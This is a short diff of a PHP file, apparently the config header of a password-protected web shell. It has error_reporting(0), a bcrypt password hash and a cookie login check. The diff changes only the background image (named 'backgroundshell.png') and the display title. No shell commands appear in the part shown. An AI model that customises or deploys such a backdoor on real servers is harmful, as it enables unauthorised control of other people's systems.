@@ -5,8 +5,8 @@ error_reporting(0);
 // Password hash punya lu bray!
 $config = [
     'pass' => '$2a$12$4Ax1TZKOob80.RLDdcFor.iJBpO6/bpdJJIiz8L1UkGhgLikefNhm', // hash bcrypt lu
-    'bg_image' => 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLzEFTrSexfvWHF3Q0FkoLu_qNW9JoPyWxHy5ePZE97BdA1KznzlB8-OdbRszy1xyIi35pi606UQusTEDt-EYo_Nii7m5BUeIvmEiitTUKIJOlZlniTQIKh82C5ASgQRgucOCwwfyiAorS9Hn8vyiBNOPYMdACDc4uF0a3rqavMaGMHFtpnRjK2wxXINVS/s16000/rudeus.png',
-    'title' => 'Rudy'  // Judul yang tampil
+    'bg_image' => 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggCjKqYU1fIWHn-hkDV1DjQcLK19Zt0CPk_M_WlewMs3A__-JNs07J9veny7PIVE6ycYly5EWIGZtsCygIY1q3uUDATel6_5CQo07m8WaSNLIrE9XP-N-n3HufbFNFW5ge8mZ5LRXc-Xd2D6fMlkvwqNfmjMCfSZkpLpK7L0BnBbGeLZMI70sAJyHN0lr_/s1254/backgroundshell.png',
+    'title' => 'FUQIANG'  // Judul yang tampil
 ];
 
 // Cek cookie login
